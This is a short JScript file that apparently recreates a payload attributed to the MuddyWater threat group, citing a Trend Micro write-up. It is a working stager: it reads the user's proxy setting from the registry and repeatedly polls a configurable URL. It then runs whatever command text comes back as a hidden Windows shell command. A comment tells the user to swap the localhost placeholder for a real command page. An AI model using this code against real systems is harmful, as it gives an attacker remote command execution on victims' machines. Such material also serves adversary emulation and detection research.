// Payload used by MuddyWater as detailed here: https://www.trendmicro.com/en_us/research/21/c/earth-vetala---muddywater-continues-to-target-organizations-in-t.html
// Replace "http://127.0.0.1:8000/cmd" with link to page containing command
// Command page should be something like: "c:\windows\system32\cmd.exe /c calc.exe"

h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
w = new ActiveXObject("WScript.Shell");
try {
    v = w.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer");
    q = v.prox.split("=")[1].split(";")[0];
    h.SetProxy(2, q);
} catch(e){;}
h.Open("GET", "http://127.0.0.1:8000/cmd", false);
while(true){
    try {
        h.Send();
        B = h.status;
        c = h.ResponseText;
        WScript.Echo(B);
        WScript.Sleep(10000);
        if (B == 200){
            WScript.Echo(c);
            new ActiveXObject("WScript.Shell").Run(c, 0, true);
            break;
        }
    } catch(e){;}
}

